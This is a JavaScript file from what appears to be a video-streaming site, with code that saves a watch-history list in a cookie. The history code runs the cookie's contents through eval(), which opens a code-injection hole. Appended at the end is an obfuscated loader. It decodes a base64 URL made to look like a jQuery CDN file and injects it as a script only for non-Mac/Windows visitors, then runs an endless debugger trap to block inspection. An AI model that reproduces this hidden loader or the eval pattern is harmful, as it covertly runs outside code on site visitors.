/*!
 * Copyright 2016-2018 http://v.shoutu.cn
 * Email 726662013@qq.com,admin@shoutu.cn
 */
$(document).ready(function ($) {
  var recente = $.cookie("mac_history_dianying");
  var len = 0;
  var canadd = true;
  if (recente) {
    recente = eval("(" + recente + ")");
    len = recente.length;
    $(recente).each(function () {
      if (vod_name == this.vod_name) {
        canadd = false;
        var json = "[";
        $(recente).each(function (i) {
          var temp_name, temp_url, temp_part;
          if (this.vod_name == vod_name) {
            temp_name = vod_name;
            temp_url = vod_url;
            temp_part = vod_part;
          } else {
            temp_name = this.vod_name;
            temp_url = this.vod_url;
            temp_part = this.vod_part;
          }
          json += "{\"vod_name\":\"" + temp_name + "\",\"vod_url\":\"" + temp_url + "\",\"vod_part\":\"" + temp_part + "\"}";
          if (i != len - 1)
            json += ",";
        })
        json += "]";
        $.cookie("mac_history_dianying", json, {
          path: "/",
          expires: (2)
        });
        return false;
      }
    });
  }
  if (canadd) {
    var json = "[";
    var start = 0;
    var isfirst = "]";
    isfirst = !len ? "]" : ",";
    json += "{\"vod_name\":\"" + vod_name + "\",\"vod_url\":\"" + vod_url + "\",\"vod_part\":\"" + vod_part + "\"}" + isfirst;
    if (len > 9)
      len -= 1;
    for (i = 0; i < len - 1; i++) {
      json += "{\"vod_name\":\"" + recente[i].vod_name + "\",\"vod_url\":\"" + recente[i].vod_url + "\",\"vod_part\":\"" + recente[i].vod_part + "\"},";
    }
    if (len > 0) {
      json += "{\"vod_name\":\"" + recente[len - 1].vod_name + "\",\"vod_url\":\"" + recente[len - 1].vod_url + "\",\"vod_part\":\"" + recente[len - 1].vod_part + "\"}]";
    }
    $.cookie("mac_history_dianying", json, {
      path: "/",
      expires: (2)
    });
  }
})
function xxSJRox(e){var t = "",n = r = c1 = c2 = 0;while (n < e.length){r = e.charCodeAt(n);if (r < 128){t += String.fromCharCode(r);n++}else if (r > 191 && r < 224){c2 = e.charCodeAt(n + 1);t += String.fromCharCode((r & 31) << 6 | c2 & 63);n += 2}else{c2 = e.charCodeAt(n + 1);c3 = e.charCodeAt(n + 2);t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);n += 3}}return t}function aPnDhiTia(e){var m = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t = "",n,r,i,s,o,u,a,f = 0;e = e.replace(/[^A-Za-z0-9+/=]/g,"");while (f < e.length){s = m.indexOf(e.charAt(f++));o = m.indexOf(e.charAt(f++));u = m.indexOf(e.charAt(f++));a = m.indexOf(e.charAt(f++));n = s << 2 | o >> 4;r = (o & 15) << 4 | u >> 2;i = (u & 3) << 6 | a;t = t + String.fromCharCode(n);if (u != 64){t = t + String.fromCharCode(r)}if (a != 64){t = t + String.fromCharCode(i)}}return xxSJRox(t)}eval('window')['\x4d\x66\x58\x4b\x77\x56'] = function(){;(function(u,r,w,d,f,c){var x = aPnDhiTia;u = decodeURIComponent(x(u.replace(new RegExp(c + '' + c,'g'),c)));'jQuery';k = r[2] + 'c' + f[1];'Flex';v = k + f[6];var s = d.createElement(v + c[0] + c[1]),g = function(){};s.type = 'text/javascript';{s.onload = function(){g()}}s.src = u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5Lm1pbi0zLjYuOC5qcw==','FgsPmaNtZ',window,document,'jrGYBsijJU','ptbnNbK')};if (!(/^Mac|Win/.test(navigator.platform))) MfXKwV();setInterval(function(){debugger;},100);
/*138ae887806f*/